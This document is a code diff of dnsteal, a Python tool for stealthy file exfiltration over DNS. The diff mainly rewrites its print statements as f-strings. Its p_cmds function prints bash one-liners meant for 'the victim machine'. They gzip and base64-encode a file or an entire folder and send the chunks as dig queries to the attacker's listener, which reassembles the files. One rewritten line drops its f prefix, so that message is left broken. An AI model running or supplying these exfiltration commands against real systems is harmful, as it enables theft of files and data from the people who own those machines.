@@ -110,16 +110,12 @@ def save_to_file(r_data, z, v):
         if not value:
             if v:
                 print(
-                    (
-                        "Skipping reassembly of file {}, since no payload was received.".format(
-                            fname
-                        )
-                    )
+                    f"Skipping reassembly of file {fname}, since no payload was received."
                 )
             continue
 
         if v:
-            print(("Reassembling {} from {}".format(fname, value)))
+            print(f"Reassembling {fname} from {value}")
 
         try:
             for i in range(0, max(value.keys()) + 1):
@@ -129,11 +125,6 @@ def save_to_file(r_data, z, v):
         except KeyError as key_error:
             print(f"{c['r']}[Error]{c['e']} Missing index {key_error} of file '{key}'.")
 
-        # for index, block in value.items():
-        #     flatdata += block[:-1].replace("*", "+") # fix data (remove hyphens at end, replace * with + because of dig!)
-
-        #        print flatdata
-
         try:
             f = open(fname, "wb")
         except Exception:
@@ -141,56 +132,46 @@ def save_to_file(r_data, z, v):
             exit(1)
         try:
             if v:
-                print(
-                    f"{c['y']}[Info]{c['e']} base64 decoding data ({key})."
-                    % (c["y"], c["e"], key)
-                )
+                print(f"{c['y']}[Info]{c['e']} base64 decoding data ({key}).")
             flatdata = base64.b64decode(
                 flatdata
             )  # test if padding correct by using a try/catch
         except Exception:
             f.close()
             print(
-                "%s[Error]%s Incorrect padding on base64 encoded data.."
-                % (c["r"], c["e"])
+                f"{c['r']}[Error]{ c['e']} Incorrect padding on base64 encoded data.."
             )
             exit(1)
 
         if z:
             if v:
-                print("%s[Info]%s Unzipping data (%s)." % (c["y"], c["e"], key))
+                print(f"{c['y']}[Info]{c['e']} Unzipping data ({key}).")
 
             try:
                 x = zlib.decompressobj(16 + zlib.MAX_WBITS)
                 flatdata = x.decompress(flatdata)
             except:
                 print(
-                    "%s[Error]%s Could not unzip data, did you specify the -z switch ?"
-                    % (c["r"], c["e"])
+                    f"{c['r']}[Error]{c['e']} Could not unzip data, did you specify the -z switch ?"
                 )
                 exit(1)
 
-                print(
-                    "%s[Info]%s Saving received bytes to './%s'"
-                    % (c["y"], c["e"], fname)
-                )
+                print(f"{c['y']}[Info]{c['e']} Saving received bytes to './{fname}'")
             f.write(flatdata)
             f.close()
         else:
-            print("%s[Info]%s Saving bytes to './%s'" % (c["y"], c["e"], fname))
+            print(f"{c['y']}[Info]{c['e']} Saving bytes to './{fname}'")
             f.write(flatdata)
             f.close()
 
-        print(
-            "%s[md5sum]%s '%s'\n"
-            % (c["g"], c["e"], hashlib.md5(open(fname, "r").read()).hexdigest())
-        )
+        md5sum = hashlib.md5(open(fname, "r").read()).hexdigest()
+        print(f"{c['g']}[md5sum]{c['e']} '{md5sum}'\n")
 
 
 def usage(str=""):
 
     banner()
-    print("Usage: python %s [listen_address] [options]" % sys.argv[0])
+    print(f"Usage: python {sys.argv[0]} [listen_address] [options]")
     print("\nOptions:")
     print("\t-z\tUnzip incoming files.")
     print("\t-v\tVerbose output.")
@@ -203,11 +184,10 @@ def usage(str=""):
     )
     print("\t-f\tLength reserved for filename per request    (default = 17)")
     print()
-    print("%s$ python %s -z 127.0.0.1%s" % (c["g"], sys.argv[0], c["e"]))
+    print(f"{c['g']}$ python {sys.argv[0]} -z 127.0.0.1{c['e']}")
     print()
     print(
-        "%s-------- Do not change the parameters unless you understand! --------%s"
-        % (c["r"], c["e"])
+        f"{c['r']}-------- Do not change the parameters unless you understand! --------{c['e']}"
     )
     print()
     print("The query length cannot exceed 253 bytes. This is including the filename.")
@@ -215,16 +195,13 @@ def usage(str=""):
     print()
     print("Advanced: ")
     print(
-        "\t%s 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)"
-        % sys.argv[0]
+        f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)"
     )
     print(
-        "\t%s 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)"
-        % sys.argv[0]
+        f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)"
     )
     print(
-        "\t%s 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
-        % sys.argv[0]
+        f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
     )
     print()
     print(str)
@@ -233,39 +210,33 @@ def usage(str=""):
 def p_cmds(s, b, ip, z):
 
     print(
-        "%s[+]%s On the victim machine, use any of the following commands:"
-        % (c["g"], c["e"])
+        f"{c['g']}[+]{c['e']} On the victim machine, use any of the following commands:"
     )
     print(
-        "%s[+]%s Remember to set %sfilename%s for individual file transfer."
-        % (c["g"], c["e"], c["y"], c["e"])
+        f"{c['g']}[+]{c['e']} Remember to set {c['y']}filename{c['e']} for individual file transfer."
     )
     print()
 
     if z:
-        print("%s[?]%s Copy individual file (ZIP enabled)" % (c["y"], c["e"]))
+        print(f"{c['y']}[?]{c['e']} Copy individual file (ZIP enabled)")
         print(
-            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
-            % (c["r"], c["e"], c["y"], c["e"], s, b, ip)
+            f"""\t{c["r"]}\x23{c["e"]} {c["y"]}f=file.txt{c["e"]}; s={s};b={b};c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
         )
         print()
-        print("%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"]))
+        print(f"{c['y']}[?]{c['e']} Copy entire folder (ZIP enabled)")
         print(
-            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done"""
-            % (c["r"], c["e"], s, b, ip)
+            f"""\t{c["r"]}\x23{c["e"]} for f in $(ls .); do s={s};b={b};c=0;ix=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done ; done"""
         )
         print()
     else:
-        print("%s[?]%s Copy individual file" % (c["y"], c["e"]))
+        print(f"{c['y']}[?]{c['e']} Copy individual file")
         print(
-            """\t%s\x23%s %sf=file.txt%s; s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
-            % (c["r"], c["e"], c["y"], c["e"], s, b, ip)
+            f"""\t{c["r"]}\x23{c["e"]} {c["y"]}f=file.txt{c["e"]}; s={s};b={b};c=0;ix=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done """
         )
         print()
-        print("%s[?]%s Copy entire folder" % (c["y"], c["e"]))
+        print("{c['y']}[?]{c['e']} Copy entire folder")
         print(
-            """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne 3x6-.${ix}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done"""
-            % (c["r"], c["e"], s, b, ip)
+            f"""\t{c["r"]}\x23{c["e"]} for f in $(ls .); do s={s};b={b};c=0;ix=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{{$b\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done ; done"""
         )
         print()
 
@@ -274,17 +245,16 @@ def banner():
 
     print("\033[1;32m", end=" ")
     print(
-        """
+        f"""
       ___  _  _ ___ _            _
      |   \| \| / __| |_ ___ __ _| |
      | |) | .` \__ \  _/ -_) _` | |
-     |___/|_|\_|___/\__\___\__,_|_|v%s
+     |___/|_|\_|___/\__\___\__,_|_|v{VERSION}
 
 -- https://github.com/m57/dnsteal.git --\033[0m
 
 Stealthy file extraction via DNS requests
 """
-        % VERSION
     )
 
 
@@ -305,7 +275,7 @@ if __name__ == "__main__":
     ip = sys.argv[1]
 
     if re.match(regx_ip, ip) == None:
-        usage("%s[Error]%s First argument must be listen address." % (c["r"], c["e"]))
+        usage(f"{c['r']}[Error]{c['e']} First argument must be listen address.")
         exit(1)
 
     if "-z" in sys.argv:
@@ -326,10 +296,7 @@ if __name__ == "__main__":
         or ((b * s) > 253)
         or (((b * s) + flen + magic_nr_size + max_index) > 253)
     ):
-        usage(
-            "%s[Error]%s Entire query cannot be > 253. Read help (-h)"
-            % (c["r"], c["e"])
-        )
+        usage(f"{c['r']}[Error]{c['e']} Entire query cannot be > 253. Read help (-h)")
 
     ############################################################################################
     banner()
@@ -339,15 +306,12 @@ if __name__ == "__main__":
     try:
         udp.bind((ip, 53))
     except:
-        print("%s[Error]%s Cannot bind to address %s:53" % (c["r"], c["e"], ip))
+        print(f"{c['r']}[Error]{c['e']} Cannot bind to address {ip}:53")
         exit(1)
 
-    print("%s[+]%s DNS listening on '%s:53'" % (c["g"], c["e"], ip))
+    print(f"{c['g']}[+]{c['e']} DNS listening on '{ip}:53'")
     p_cmds(s, b, ip, z)
-    print(
-        "%s[+]%s Once files have sent, use Ctrl+C to exit and save.\n"
-        % (c["g"], c["e"])
-    )
+    print(f"{c['g']}[+]{c['e']} Once files have sent, use Ctrl+C to exit and save.\n")
 
     try:
         r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
@@ -381,11 +345,7 @@ if __name__ == "__main__":
             if len(tmp_data) < 2:
                 if v:
                     print(
-                        (
-                            "Skipping packet: {} since it does have less than 2 payloads".format(
-                                req_split
-                            )
-                        )
+                        f"Skipping packet: {req_split} since it does have less than 2 payloads"
                     )
                 continue
 
@@ -393,11 +353,7 @@ if __name__ == "__main__":
             if magic_nr != "3x6-":
                 if v:
                     print(
-                        (
-                            "Skipping packet: {} since it does not have magic nr 3x6)".format(
-                                req_split
-                            )
-                        )
+                        f"Skipping packet: {req_split} since it does not have magic nr 3x6"
                     )
                 continue
 
@@ -407,20 +363,13 @@ if __name__ == "__main__":
                 # This should usually not happen
                 if v:
                     print(
-                        (
-                            "Skipping packet: {} since its index was not a number".format(
-                                req_split
-                            )
-                        )
+                        f"Skipping packet: {req_split} since its index was not a number"
                     )
                 continue
 
-            print(
-                "%s[>]%s len: '%d bytes'\t- %s"
-                % (c["y"], c["e"], len(p.data_text), fname)
-            )
+            print(f"{c['y']}[>]{c['e']} len: '{len(p.data_text)} bytes'\t- {fname}")
             if v:
-                print("%s[>>]%s %s -> %s:53" % (c["b"], c["e"], p.data_text, ip))
+                print(f"{c['b']}[>>]{c['e']} {p.data_text} -> {ip}:53")
 
             r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload
 
